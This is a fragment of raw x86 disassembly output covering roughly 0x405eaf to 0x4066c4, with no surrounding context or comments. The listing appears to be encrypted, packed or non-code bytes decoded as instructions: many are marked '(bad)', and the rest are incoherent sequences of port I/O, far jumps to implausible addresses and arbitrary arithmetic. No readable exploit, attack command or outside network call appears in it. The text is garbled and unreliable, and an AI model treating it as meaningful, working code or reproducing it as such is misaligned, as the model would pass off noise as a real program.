  405eaf:	xchg   DWORD PTR [eax],edi
  405eb1:	jne    0x405f01
  405eb3:	imul   edi,DWORD PTR ds:0x301b72d0,0x95b4e387
  405ebd:	cmp    dh,BYTE PTR [ebp+0x75e36365]
  405ec3:	(bad)  
  405ec4:	cld    
  405ec5:	or     cl,BYTE PTR fs:[edi-0x42]
  405ec9:	xchg   edx,eax
  405eca:	jbe    0x405ec1
  405ecc:	add    BYTE PTR [edx],0xd3
  405ecf:	adc    eax,0xca5d58b6
  405ed4:	(bad)  
  405ed5:	(bad)
  405ed8:	(bad)  
  405eda:	sti    
  405edb:	rcr    dh,cl
  405edd:	cmp    BYTE PTR [ebp+0x2b5f7ac3],al
  405ee3:	sbb    ebp,DWORD PTR [ecx]
  405ee5:	repnz sub bl,dh
  405ee8:	jae    0x405edc
  405eea:	push   ebp
  405eeb:	(bad)  
  405eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eed:	shl    edx,1
  405eef:	shl    DWORD PTR [ebp+0xb3ce535],0xce
  405ef6:	cmc    
  405ef7:	mov    ecx,0x99e45f14
  405efc:	leave  
  405efd:	outs   dx,BYTE PTR ds:[esi]
  405efe:	cmc    
  405eff:	in     eax,dx
  405f00:	jbe    0x405f56
  405f02:	ret    
  405f03:	sub    eax,0xceaa9645
  405f08:	mov    dl,0x29
  405f0a:	pop    edi
  405f0b:	adc    eax,0x8c25cf8b
  405f10:	mov    ecx,0xecedfd16
  405f15:	pop    ebx
  405f16:	rcr    BYTE PTR [eax-0x65],1
  405f19:	(bad)  
  405f1a:	in     al,0xa2
  405f1c:	test   al,0xe5
  405f1f:	fsub   DWORD PTR [esi]
  405f21:	xor    BYTE PTR [esi],cl
  405f23:	xor    BYTE PTR [eax+0x1b],cl
  405f26:	adc    ebp,DWORD PTR [eax+0x2e]
  405f29:	arpl   WORD PTR [ecx-0x44ccb24],cx
  405f2f:	inc    edi
  405f30:	adc    esi,DWORD PTR [ebp-0x51]
  405f33:	lock mul BYTE PTR [ecx]
  405f36:	retf   0xfd25
  405f39:	inc    edi
  405f3a:	adc    eax,0xdb8a32dd
  405f3f:	cmp    DWORD PTR [ebp-0x63d31a84],esi
  405f45:	mov    ebp,0xe4bd3698
  405f4a:	or     DWORD PTR [ebx-0xeae0723],0xb2b3ba62
  405f54:	sub    DWORD PTR [edi+0x3f],esi
  405f57:	and    al,0x33
  405f59:	fdiv   QWORD PTR [bx-0x35b3]
  405f5e:	jle    0x405f32
  405f60:	xchg   ebx,eax
  405f61:	mov    esi,0xe78f087f
  405f66:	shr    BYTE PTR [edx-0x125f24cd],1
  405f6c:	pusha  
  405f6d:	or     al,0x19
  405f6f:	ret    0x833e
  405f72:	inc    eax
  405f73:	push   0x5f
  405f75:	or     esi,DWORD PTR [edx-0x41fb7ea1]
  405f7b:	mov    BYTE PTR [ebx],bl
  405f7d:	sbb    al,0x3a
  405f7f:	and    al,0x1d
  405f81:	mov    cl,0x1c
  405f83:	xchg   esp,eax
  405f84:	sbb    ebx,esi
  405f86:	add    DWORD PTR [edi+0x718a8761],edi
  405f8c:	cmp    edx,ebp
  405f8e:	jle    0x406006
  405f90:	mov    dh,0x5
  405f92:	ror    BYTE PTR [eax+ecx*2],0xf9
  405f96:	jns    0x405ffe
  405f98:	loopne 0x405f87
  405f9a:	mov    eax,ds:0xa89d4c06
  405f9f:	xchg   ecx,eax
  405fa0:	fstp   QWORD PTR [edi]
  405fa2:	out    0xee,eax
  405fa4:	popa   
  405fa5:	push   0x77be3216
  405faa:	mov    edx,0x95d40a6c
  405faf:	add    eax,DWORD PTR ds:0xfe4af3dd
  405fb5:	sbb    esi,DWORD PTR [edx-0x454eced1]
  405fbb:	out    0x1a,eax
  405fbd:	add    dl,ah
  405fbf:	pop    ecx
  405fc0:	or     esi,DWORD PTR [edx+ebp*2]
  405fc3:	(bad)  
  405fc4:	imul   edi,ebp,0xffffffdf
  405fc7:	les    edi,FWORD PTR [ebx-0x2a]
  405fca:	sbb    ebx,0x39b2f9e9
  405fd0:	mov    ecx,0xd08f403
  405fd5:	aaa    
  405fd6:	mov    esi,0xc88cb331
  405fdb:	inc    esi
  405fdc:	mov    BYTE PTR [ebp-0x1],cl
  405fdf:	or     al,0x22
  405fe1:	xor    al,0x62
  405fe3:	cli    
  405fe4:	xor    al,0x81
  405fe6:	jmp    0x406020
  405fe8:	ins    DWORD PTR es:[edi],dx
  405fe9:	std    
  405fea:	mov    WORD PTR [ecx+0x1b],es
  405fed:	cmc    
  405fee:	inc    edi
  405fef:	(bad)  
  405ff0:	xor    al,0x18
  405ff2:	add    BYTE PTR [esi-0x1a],cl
  405ff5:	jg     0x405ff5
  405ff7:	call   0x57d3375f
  405ffc:	mov    ebp,DWORD PTR [edi]
  405ffe:	cs stos BYTE PTR es:[edi],al
  406000:	adc    DWORD PTR [ecx+0x52],edx
  406003:	dec    ebp
  406004:	pop    edi
  406005:	sbb    BYTE PTR [esi-0x38],0x84
  406009:	jnp    0x406064
  40600b:	mov    ds:0xe83db492,eax
  406010:	fmul   DWORD PTR [edi-0xa78ceb1]
  406016:	push   ss
  406017:	jp     0x406000
  406019:	xor    bh,bh
  40601b:	out    0xf6,eax
  40601d:	sbb    al,dl
  40601f:	mov    ds:0x8ec0dc2a,al
  406024:	rcr    ebx,0x36
  406027:	adc    edi,0xe3b3f7b9
  40602d:	loopne 0x405fb4
  40602f:	sbb    al,0xc5
  406031:	fdiv   QWORD PTR [edx-0x1dd40b10]
  406037:	out    0x47,eax
  406039:	dec    esp
  40603a:	pop    esp
  40603b:	sub    bl,BYTE PTR [ebp-0x3f]
  40603e:	ins    DWORD PTR es:[edi],dx
  40603f:	sbb    BYTE PTR [edx],0x7e
  406042:	repnz dec esp
  406044:	push   edx
  406045:	add    DWORD PTR [esi-0x209190df],esi
  40604b:	ds jp  0x406023
  40604e:	xchg   esi,eax
  40604f:	mov    DWORD PTR [eax+esi*1+0x199c3f5b],esp
  406056:	dec    ebx
  406057:	(bad)  
  406058:	js     0x40600c
  40605a:	out    dx,al
  40605b:	pop    ecx
  40605c:	xchg   edi,eax
  40605d:	or     al,0x4a
  40605f:	lods   eax,DWORD PTR ds:[esi]
  406060:	jecxz  0x40607f
  406062:	pop    eax
  406063:	(bad)
  406067:	xor    ebp,DWORD PTR [ebp+0x57]
  40606a:	jns    0x406081
  40606c:	pusha  
  40606d:	syscall 
  40606f:	dec    ecx
  406070:	or     ecx,ebx
  406072:	cmp    edx,edx
  406074:	dec    esi
  406075:	and    dl,BYTE PTR ds:0x946246fd
  40607b:	cmp    eax,edx
  40607d:	mov    esp,0x90f72f9d
  406082:	mov    ecx,0xc5120bf6
  406087:	int3   
  406088:	jecxz  0x4060ef
  40608a:	jmp    0xd446aa2e
  40608f:	adc    DWORD PTR [edi+0x37],0xe07d82a4
  406096:	and    ch,bh
  406098:	mul    BYTE PTR [ebx+ecx*4-0x54]
  40609c:	cmp    DWORD PTR [ecx-0xb66fac6],esi
  4060a2:	pop    ebp
  4060a3:	mov    esi,0x50a0e09a
  4060a8:	lods   eax,DWORD PTR ds:[esi]
  4060a9:	xchg   ebp,eax
  4060aa:	inc    ebp
  4060ab:	js     0x4060ce
  4060ad:	lahf   
  4060ae:	jne    0x4060a4
  4060b0:	fst    DWORD PTR [esi-0x7]
  4060b3:	int3   
  4060b4:	mov    esi,0x74d7219a
  4060b9:	sub    esi,DWORD PTR [ebx+0x53827032]
  4060bf:	out    0x31,al
  4060c1:	js     0x406142
  4060c3:	int    0xd9
  4060c5:	adc    DWORD PTR [esi-0x33],0x4a
  4060c9:	xor    DWORD PTR [eax+0x18],0xcafd20d7
  4060d0:	sbb    eax,0xa34c9105
  4060d5:	aaa    
  4060d6:	fidivr WORD PTR [esi]
  4060d8:	push   esp
  4060d9:	cdq    
  4060da:	jmp    0x40607a
  4060dc:	and    al,0xca
  4060de:	div    BYTE PTR [ebp+edi*2+0x6e]
  4060e2:	mov    ds:0x42e00442,al
  4060e7:	xor    al,0xa2
  4060e9:	(bad)  
  4060eb:	xor    bl,BYTE PTR [ebx+0x3f4573b0]
  4060f1:	loop   0x40612b
  4060f3:	mov    ds:0x84bd958,eax
  4060f8:	mov    edx,0xba1669e5
  4060fd:	jno    0x4060c2
  4060ff:	dec    ebx
  406100:	loopne 0x4060c5
  406102:	test   esi,edx
  406104:	xchg   edi,eax
  406105:	rcr    BYTE PTR [esi],cl
  406107:	out    0x61,al
  406109:	ins    DWORD PTR es:[edi],dx
  40610a:	push   es
  40610b:	lods   ax,WORD PTR ds:[esi]
  40610d:	inc    edi
  40610e:	inc    esi
  40610f:	gs shr bh,cl
  406112:	jno    0x406129
  406114:	add    eax,0x7640f909
  406119:	xchg   esp,eax
  40611a:	inc    ecx
  40611b:	in     eax,dx
  40611c:	fcom   QWORD PTR [ecx+0x6c]
  40611f:	mov    ch,0xb8
  406121:	xchg   esp,eax
  406122:	dec    esi
  406123:	xchg   edx,eax
  406124:	clc    
  406125:	xchg   edi,eax
  406126:	pop    eax
  406128:	xor    eax,0x6f15cfdf
  40612d:	xor    bh,BYTE PTR ds:0xbe07cbf8
  406133:	push   ss
  406134:	cmp    BYTE PTR [edi+0x120173f2],bh
  40613a:	mov    es,WORD PTR [eax+0x4e]
  40613d:	jbe    0x4060e2
  40613f:	clc    
  406140:	add    edi,ecx
  406142:	add    BYTE PTR [eax+0x62],ch
  406145:	inc    ecx
  406146:	call   0x66ae1c0a
  40614b:	pusha  
  40614c:	ret    0x220a
  40614f:	cmp    DWORD PTR [esi+0x48],ebp
  406152:	rcl    ah,1
  406154:	(bad)  
  406155:	pminsw mm7,mm3
  406158:	and    BYTE PTR [ebx+0x3ebe543f],ah
  40615e:	sbb    ch,BYTE PTR [edi-0x6fc071a0]
  406164:	mov    dl,0x5d
  406166:	mov    al,0xe6
  406168:	dec    edx
  406169:	and    DWORD PTR [edx+0x691bccf7],0xb
  406170:	cmp    esi,DWORD PTR [eax-0x719bae2]
  406176:	adc    BYTE PTR [ecx+0x6f],0xdd
  40617a:	out    0x10,al
  40617c:	out    dx,al
  40617d:	pop    ds
  40617e:	iret   
  40617f:	sub    eax,0xb1b2c70e
  406184:	dec    edx
  406185:	sbb    edi,DWORD PTR [esp+ecx*1+0x7e]
  406189:	xor    BYTE PTR [ebx+0x31bab87b],bh
  40618f:	retf   
  406190:	push   ss
  406191:	scas   al,BYTE PTR es:[edi]
  406192:	arpl   bp,ax
  406194:	mov    edx,DWORD PTR [edx+0x7731a359]
  40619a:	cmc    
  40619b:	xchg   ebx,eax
  40619c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40619e:	loopne 0x40615b
  4061a0:	ja     0x40616e
  4061a2:	fsubr  QWORD PTR [edx+ecx*4]
  4061a5:	not    ebx
  4061a7:	mul    BYTE PTR cs:[esi+0x711f76c]
  4061ae:	sbb    al,cl
  4061b0:	cmp    al,0xf3
  4061b2:	int3   
  4061b3:	out    dx,eax
  4061b4:	fimul  DWORD PTR [edi+0x52ff19aa]
  4061ba:	sub    eax,0x48b6c116
  4061bf:	and    eax,0x5422f90c
  4061c4:	push   0x17c6bc82
  4061c9:	clc    
  4061ca:	or     cl,ah
  4061cc:	or     eax,0x166c17cf
  4061d1:	mov    cl,0xd7
  4061d3:	sbb    bl,ch
  4061d5:	fdivr  QWORD PTR [edx-0x5a]
  4061d8:	add    al,0xea
  4061da:	add    eax,esp
  4061dc:	loop   0x40624b
  4061de:	fisttp WORD PTR [ebp-0x76]
  4061e1:	test   BYTE PTR [ebx+ebp*2+0x4d],ch
  4061e5:	sbb    al,0x5b
  4061e7:	lock xchg edx,eax
  4061e9:	push   edi
  4061ea:	push   ebx
  4061eb:	into   
  4061ec:	js     0x4061e9
  4061ee:	xchg   BYTE PTR [ebp+edi*1-0x66],bl
  4061f2:	cwde   
  4061f3:	sub    eax,0xfc16ff15
  4061f8:	cmp    ebx,ebp
  4061fa:	pop    ebp
  4061fb:	xchg   esp,eax
  4061fc:	mov    dh,0x4
  4061fe:	xchg   ebp,eax
  4061ff:	call   0x57b6bdea
  406204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406205:	dec    eax
  406206:	out    0xca,eax
  406208:	mov    al,ds:0xd9530b60
  40620d:	and    eax,0x34a5388d
  406212:	xchg   edi,edx
  406214:	out    dx,eax
  406215:	(bad)  
  406216:	add    BYTE PTR [edx+0x49],ah
  406219:	mov    dl,0xb2
  40621b:	mov    al,0x3
  40621d:	(bad)  
  40621f:	lods   eax,DWORD PTR ds:[esi]
  406220:	sbb    al,0xcc
  406222:	scas   eax,DWORD PTR es:[edi]
  406223:	cwde   
  406224:	(bad)  
  406225:	ficomp WORD PTR [ebx+0x147d27cf]
  40622b:	inc    edx
  40622c:	xlat   BYTE PTR ds:[ebx]
  40622d:	sbb    dh,BYTE PTR [edx-0x5bf91c65]
  406233:	(bad)  
  406234:	jnp    0x406256
  406236:	test   eax,0x3fa8f468
  40623b:	push   ebp
  40623c:	pushf  
  40623d:	scas   al,BYTE PTR es:[edi]
  40623e:	ror    DWORD PTR [edx+0x9],0x0
  406242:	xor    al,0x7b
  406244:	sbb    BYTE PTR [ecx+0x6b],bl
  406247:	adc    edi,DWORD PTR [eax+ebp*8+0x1f]
  40624b:	lock add cl,BYTE PTR [edx-0x1d]
  40624f:	mov    esp,0x300ca2bb
  406254:	mov    ebx,0xad1a963c
  406259:	mov    al,0x27
  40625b:	pusha  
  40625c:	jle    0x406204
  40625e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40625f:	mov    WORD PTR [eax-0x59c15f81],es
  406265:	out    dx,eax
  406266:	je     0x4061ee
  406268:	fs out 0xb8,al
  40626b:	mov    ch,0x38
  40626d:	out    0x7,al
  40626f:	popa   
  406270:	gs sub ch,bl
  406273:	push   0xffffffea
  406275:	test   BYTE PTR [edx],0x8f
  406278:	popf   
  406279:	mov    es,WORD PTR [ecx]
  40627b:	push   0xffffff91
  40627d:	mov    ebp,0x3d54908b
  406282:	jne    0x4062c0
  406284:	jmp    0x180f:0x6d8912bc
  40628b:	hlt    
  40628c:	jecxz  0x406220
  40628e:	(bad)  
  40628f:	adc    edx,esp
  406291:	push   edx
  406292:	ja     0x4062dc
  406294:	lock dec ecx
  406296:	adc    al,0x6
  406298:	or     BYTE PTR [ebp+eiz*4-0x27453ae5],bl
  40629f:	jl     0x406307
  4062a1:	fs adc al,0x24
  4062a4:	iret   
  4062a5:	mov    fs,edx
  4062a7:	add    DWORD PTR [ebp-0x4a7708ca],eax
  4062ad:	(bad)  
  4062ae:	jg     0x406244
  4062b0:	xor    BYTE PTR [ebx],0x23
  4062b3:	mov    ds:0xa662db50,al
  4062b8:	cld    
  4062b9:	mov    bl,0x6f
  4062bb:	jmp    0xbb4c1a58
  4062c0:	shl    DWORD PTR [ebx+0x9761c11],1
  4062c6:	xor    ah,BYTE PTR [ecx+0x161cd330]
  4062cc:	jbe    0x406279
  4062ce:	and    eax,0x270760f9
  4062d3:	and    eax,0xee1e2cc2
  4062d8:	into   
  4062d9:	fcom   DWORD PTR [esi]
  4062db:	aam    0xf2
  4062dd:	js     0x40632d
  4062df:	or     cl,bl
  4062e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062e2:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4062e4:	mov    dh,0x64
  4062e6:	add    al,0x9f
  4062e8:	jecxz  0x406290
  4062ea:	dec    esi
  4062eb:	sub    al,0xa1
  4062ed:	in     al,0xa5
  4062ef:	(bad)  
  4062f0:	fisubr WORD PTR [edx-0x24]
  4062f3:	xchg   BYTE PTR [ebp+0x571442f1],bl
  4062f9:	dec    ecx
  4062fa:	cmp    eax,0xf0e4f0c5
  4062ff:	mov    bl,BYTE PTR [edx-0x23e0abe5]
  406305:	shr    BYTE PTR [esi-0x36],1
  406308:	std    
  406309:	nop
  40630a:	jge    0x406327
  40630c:	jmp    0x40635c
  40630e:	push   ss
  40630f:	shl    DWORD PTR [edx],cl
  406311:	sbb    BYTE PTR [ebp+0x778c18a9],0x62
  406318:	int3   
  406319:	into   
  40631a:	repz mov bl,0x65
  40631d:	adc    eax,esi
  40631f:	rcl    BYTE PTR [edx-0xaa050c7],1
  406325:	dec    edi
  406326:	loope  0x4062b7
  406328:	out    dx,al
  406329:	mov    esi,0x54e6d68c
  40632e:	push   cs
  40632f:	add    ah,dh
  406331:	test   eax,0xe225860c
  406336:	inc    edx
  406337:	sbb    al,0x13
  406339:	add    DWORD PTR [esi],edx
  40633b:	mov    ecx,0xd54fcf2f
  406340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406341:	pop    ecx
  406342:	inc    esp
  406343:	inc    eax
  406344:	out    dx,eax
  406345:	push   eax
  406346:	in     al,dx
  406347:	sar    BYTE PTR [esi+0x5c],0x2b
  40634b:	mov    bh,0xef
  40634d:	popa   
  40634e:	mov    dl,0x54
  406350:	mov    cl,0xac
  406352:	mov    ecx,0x5bdc82cf
  406357:	or     eax,DWORD PTR [ebx-0x25105983]
  40635d:	xchg   edi,eax
  40635e:	xchg   DWORD PTR [ecx+0x77],ebx
  406361:	scas   eax,DWORD PTR es:[edi]
  406362:	or     bh,0xf5
  406365:	pop    DWORD PTR [edx-0x58]
  406368:	loopne 0x40636f
  40636a:	adc    BYTE PTR [ecx+eax*8-0x1205ec87],0x9e
  406372:	dec    esp
  406373:	or     ebx,eax
  406375:	scas   eax,DWORD PTR es:[edi]
  406376:	add    BYTE PTR [edi-0x2ee8f65],cl
  40637c:	mov    al,ds:0x1f2d4885
  406381:	gs mov ebp,0x37758289
  406387:	lea    esi,[ebx]
  406389:	neg    BYTE PTR ds:0xf7b596b5
  40638f:	push   ecx
  406390:	and    esp,edx
  406392:	(bad)  
  406393:	sahf   
  406394:	push   cs
  406395:	test   eax,0x299d8353
  40639a:	ss aas 
  40639c:	std    
  40639d:	xlat   BYTE PTR ds:[ebx]
  40639e:	sbb    cl,BYTE PTR [ecx+0x5e]
  4063a1:	pop    ds
  4063a2:	or     BYTE PTR [edi+eiz*4-0x37112903],dh
  4063a9:	mov    edx,0xd56a660c
  4063ae:	xchg   DWORD PTR [ebx],ebp
  4063b0:	fmul   QWORD PTR [ebp-0x5d11fff1]
  4063b6:	mov    ah,0x71
  4063b8:	dec    ebx
  4063b9:	cdq    
  4063ba:	ret    0x4ef3
  4063bd:	in     eax,0xbb
  4063bf:	sbb    ch,0xf3
  4063c2:	jnp    0x406398
  4063c4:	bound  ebp,QWORD PTR [eax+0xcd7dfd6]
  4063ca:	stc    
  4063cb:	out    dx,eax
  4063cc:	aaa    
  4063cd:	dec    esp
  4063ce:	jnp    0x40635b
  4063d0:	sbb    DWORD PTR [ecx+0x5be144d0],eax
  4063d6:	fxch   st(3)
  4063d8:	dec    edx
  4063d9:	ja     0x40643e
  4063db:	and    DWORD PTR [edi-0x20],0x55
  4063df:	mov    ah,0x8b
  4063e1:	js     0x406367
  4063e3:	clc    
  4063e4:	(bad)  
  4063e5:	retf   
  4063e6:	gs push cs
  4063e8:	jg     0x40641f
  4063ea:	cli    
  4063eb:	ins    BYTE PTR es:[edi],dx
  4063ec:	cli    
  4063ed:	xchg   DWORD PTR [ecx],eax
  4063ef:	inc    ebx
  4063f0:	sbb    al,0x63
  4063f2:	js     0x40643c
  4063f4:	inc    ecx
  4063f5:	mov    BYTE PTR [ebx-0x18],dh
  4063f8:	mov    eax,ds:0x7eaeb3da
  4063fd:	fcomp  DWORD PTR [esi+eiz*1-0x4d]
  406401:	and    BYTE PTR [esi],0x36
  406404:	(bad)  
  406406:	ds push esp
  406408:	inc    edx
  406409:	xchg   edx,eax
  40640a:	adc    esp,ecx
  40640c:	repnz mov bl,0xec
  40640f:	stos   DWORD PTR es:[edi],eax
  406410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406411:	iret   
  406412:	sbb    eax,0x9968d4d3
  406417:	or     BYTE PTR [eax+0x6a8b8dea],0x16
  40641e:	mov    bl,0x28
  406420:	and    DWORD PTR [eax-0x62],0x18
  406424:	adc    eax,0x6437b436
  406429:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40642a:	cmovbe si,WORD PTR [eax]
  40642e:	jg     0x4064a8
  406430:	cdq    
  406431:	out    0xa4,eax
  406433:	arpl   WORD PTR [eax],di
  406435:	inc    esi
  406436:	cmp    DWORD PTR [ebx],ecx
  406438:	sbb    dh,BYTE PTR [edi+0x404cdcb7]
  40643e:	ss aad 0xff
  406441:	cmp    DWORD PTR [ecx-0xb],ebp
  406444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406445:	or     DWORD PTR [ebp-0x70],esi
  406448:	aaa    
  406449:	mov    dh,dh
  40644b:	push   ds
  40644c:	leave  
  40644d:	aaa    
  40644e:	popf   
  40644f:	aad    0xf3
  406451:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406452:	sub    eax,esi
  406454:	ja     0x4063f9
  406456:	xor    esi,DWORD PTR [ebp+0x4f186539]
  40645c:	aam    0x75
  40645e:	mov    edx,0x21ca8bb
  406463:	cmp    eax,0xbd919d71
  406468:	mov    DWORD PTR [ecx],ebx
  40646a:	jmp    0xe65f34a7
  40646f:	out    0xc4,al
  406471:	pop    ecx
  406472:	mov    esi,0x1bd72300
  406477:	sub    al,0x20
  406479:	pop    esi
  40647a:	xlat   BYTE PTR ds:[ebx]
  40647b:	js     0x40649d
  40647d:	pop    esi
  40647e:	push   edi
  40647f:	int3   
  406480:	lods   al,BYTE PTR ds:[esi]
  406481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406482:	shl    BYTE PTR [edi],cl
  406484:	adc    edx,DWORD PTR [ebx+ebx*8-0x71787b04]
  40648b:	mov    ebp,0xf126cf8a
  406490:	inc    eax
  406491:	dec    dh
  406493:	(bad)  
  406495:	fcom   QWORD PTR [edi]
  406497:	pop    eax
  406498:	test   eax,0xcff9bace
  40649d:	cmp    edi,esi
  40649f:	push   esi
  4064a0:	jo     0x40647c
  4064a2:	or     DWORD PTR [edi+edx*2+0x7ee06e54],ebp
  4064a9:	jo     0x40644d
  4064ab:	or     ah,BYTE PTR [ebp-0x7f]
  4064ae:	cld    
  4064af:	mov    BYTE PTR [edi-0x2a],al
  4064b2:	xor    DWORD PTR [ebp-0x3100814e],edi
  4064b8:	mov    ds:0x635b8bcf,eax
  4064bd:	loop   0x4064be
  4064bf:	xchg   BYTE PTR [ebx-0x3e6f28d2],bl
  4064c5:	sub    DWORD PTR [eax+0xf8c3ac4],ebp
  4064cb:	or     DWORD PTR [edi-0x779d2116],ebp
  4064d1:	jmp    0x39e5:0x54dd5da9
  4064d8:	mov    eax,ds:0x40f4ecb9
  4064dd:	std    
  4064de:	inc    edx
  4064df:	sbb    ebp,DWORD PTR [edi-0x46]
  4064e2:	xchg   edi,eax
  4064e3:	dec    esi
  4064e4:	(bad)  
  4064e5:	(bad)  
  4064e6:	jnp    0x406488
  4064e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064e9:	jp     0x406538
  4064eb:	test   al,0xe7
  4064ed:	jmp    0x7fe2:0x1feef347
  4064f4:	mov    eax,ds:0xb697bbae
  4064f9:	jmp    0xe401320a
  4064fe:	push   ds
  4064ff:	sbb    eax,0x1c5c9af
  406504:	pop    ds
  406505:	jae    0x4064d0
  406507:	jmp    0x4064d8
  406509:	rcl    DWORD PTR [esi+0x20c5e5f1],0x17
  406510:	into   
  406511:	fnstcw WORD PTR [ecx]
  406513:	popf   
  406514:	stos   BYTE PTR es:[edi],al
  406515:	push   ebx
  406516:	pop    ebp
  406517:	and    al,0x36
  406519:	sbb    eax,0x77c89d96
  40651e:	inc    edx
  40651f:	fdivr  QWORD PTR [eax-0x525acd84]
  406525:	and    bh,BYTE PTR [ebp-0x6b]
  406528:	dec    eax
  406529:	inc    edi
  40652a:	pop    eax
  40652b:	aad    0x76
  40652d:	lea    ebx,[eax]
  40652f:	loope  0x40657b
  406531:	pushf  
  406532:	cli    
  406533:	addr16 clc 
  406535:	inc    edx
  406536:	or     al,0xf0
  406538:	jg     0x4064d0
  40653a:	xor    eax,0x6e6e4dbb
  40653f:	addr16 jmp 0xf1f6:0x49e8e4b8
  406547:	mov    dh,0xb2
  406549:	popf   
  40654a:	pop    es
  40654b:	(bad)  
  40654c:	in     eax,dx
  40654d:	ret    
  40654e:	mov    ecx,0x356784d7
  406553:	add    DWORD PTR ds:0x3b37f06,esp
  406559:	dec    ebx
  40655a:	xchg   edx,eax
  40655b:	xor    dl,al
  40655d:	xor    ah,ah
  40655f:	add    DWORD PTR [edx+0x26],ebp
  406562:	mov    ds:0x3a25a137,eax
  406567:	lds    eax,FWORD PTR [edx+0x31]
  40656a:	inc    ecx
  40656b:	cmp    al,0xd5
  40656d:	mov    cl,0xc6
  40656f:	adc    al,0x6c
  406571:	sbb    dl,bl
  406573:	data16 int 0x5
  406576:	lock xchg edx,eax
  406578:	dec    edi
  406579:	sahf   
  40657a:	add    BYTE PTR [edi-0x18dc7a24],bh
  406580:	mov    dl,0x68
  406582:	fldl2e 
  406584:	pop    ebx
  406585:	push   0xa00fb4ea
  40658a:	xchg   esi,eax
  40658b:	push   eax
  40658c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40658d:	mov    ds:0x6c1b0d93,eax
  406592:	add    edi,DWORD PTR [ecx-0x31eddd47]
  406598:	fsub   QWORD PTR [ebx-0x73374170]
  40659e:	ja     0x40656e
  4065a0:	pop    ecx
  4065a1:	in     eax,dx
  4065a2:	mov    esp,0x6dfc4ae3
  4065a7:	jno    0x406600
  4065a9:	push   DWORD PTR [ecx+0x1d71abce]
  4065af:	enter  0x248f,0x86
  4065b3:	cwde   
  4065b4:	(bad)  
  4065b5:	xchg   ebx,eax
  4065b6:	popa   
  4065b7:	jmp    0x755f:0xfc760b36
  4065be:	dec    esi
  4065bf:	sar    BYTE PTR [edx+0x30],0x99
  4065c3:	pop    ecx
  4065c4:	adc    eax,0xd8db1d2b
  4065c9:	clc    
  4065ca:	ret    0xd049
  4065cd:	pop    ecx
  4065ce:	fldcw  WORD PTR [esi-0x8f7d6f6]
  4065d4:	pusha  
  4065d5:	cli    
  4065d6:	(bad)  
  4065d7:	mov    edx,0x5c16d412
  4065dc:	jnp    0x4065d7
  4065de:	cmc    
  4065df:	mov    al,ss:0xaaf670b5
  4065e5:	jnp    0x406574
  4065e7:	cmc    
  4065e8:	push   esp
  4065e9:	(bad)  
  4065ea:	fadd   QWORD PTR [eax-0x5c]
  4065ed:	push   0x5e
  4065ef:	xor    cl,BYTE PTR [ebx+0x69]
  4065f2:	xchg   edi,eax
  4065f3:	inc    ecx
  4065f4:	aaa    
  4065f5:	stos   DWORD PTR es:[edi],eax
  4065f6:	loopne 0x4065d7
  4065f8:	icebp  
  4065f9:	or     al,0x33
  4065fb:	jo     0x4065b8
  4065fd:	sub    eax,0xe6678e54
  406602:	sbb    ah,BYTE PTR [edx+ebp*2]
  406605:	adc    edx,DWORD PTR [ebp-0x7f]
  406608:	sti    
  406609:	xor    BYTE PTR [edi],bh
  40660b:	fstp   DWORD PTR gs:[ebx]
  40660e:	inc    esp
  40660f:	outs   dx,DWORD PTR ds:[esi]
  406610:	mov    edi,0xee8596a9
  406615:	sbb    eax,0xf53cdf17
  40661a:	sub    esp,0x8fe06ec
  406620:	repz push esp
  406622:	or     BYTE PTR [esi],bh
  406624:	xchg   ecx,eax
  406625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406626:	xchg   esi,eax
  406627:	cmp    ebx,DWORD PTR [ebp-0x7b7df7ea]
  40662d:	retf   
  40662e:	call   0x935cb51
  406633:	mov    ds:0xbd57606f,eax
  406638:	pop    edx
  406639:	fldenv ss:[ecx-0x6]
  40663d:	xor    DWORD PTR [ecx+0x521ea4f9],esi
  406643:	aad    0x47
  406645:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  406647:	inc    edi
  406648:	inc    ebp
  406649:	aas    
  40664a:	add    BYTE PTR ds:0xf7dcc2b5,cl
  406650:	mov    BYTE PTR [ecx-0x66],cl
  406653:	jle    0x406618
  406655:	push   eax
  406656:	inc    ecx
  406657:	dec    edi
  406658:	push   esi
  406659:	cwde   
  40665a:	xlat   BYTE PTR ds:[ebx]
  40665b:	pop    es
  40665c:	imul   cl
  40665e:	ss jg  0x406655
  406661:	inc    ebx
  406662:	lock std 
  406664:	cmp    al,0xdc
  406666:	mov    dh,0x58
  406668:	cwde   
  406669:	xchg   BYTE PTR [ecx],cl
  40666b:	inc    BYTE PTR [eax]
  40666d:	jmp    0x2b39:0x97d03db2
  406674:	push   es
  406675:	push   ss
  406676:	cld    
  406677:	mov    eax,0x22844e52
  40667c:	cs inc edx
  40667e:	fcomi  st,st(5)
  406680:	jle    0x4066ff
  406682:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406683:	push   0x64d2d93e
  406688:	clc    
  406689:	mov    bh,0x42
  40668b:	lock clc 
  40668d:	mov    al,0xa1
  40668f:	addr16 jmp 0xe2be4fa6
  406695:	or     DWORD PTR [ebx-0x3a],0x2c4b0d46
  40669c:	xchg   ecx,eax
  40669d:	rol    BYTE PTR [ecx-0x623570d8],0x71
  4066a4:	mov    esi,0x1af23921
  4066a9:	inc    esi
  4066aa:	lea    esp,[eax]
  4066ac:	xor    eax,0x63254915
  4066b1:	pop    edi
  4066b2:	and    al,0x1e
  4066b4:	inc    edi
  4066b5:	fwait
  4066b6:	es stc 
  4066b8:	cmp    eax,0xa9c422f1
  4066bd:	sbb    BYTE PTR [eax+0x5acf9abd],0x59
  4066c4:	cmp    eax,0x4be7f34f
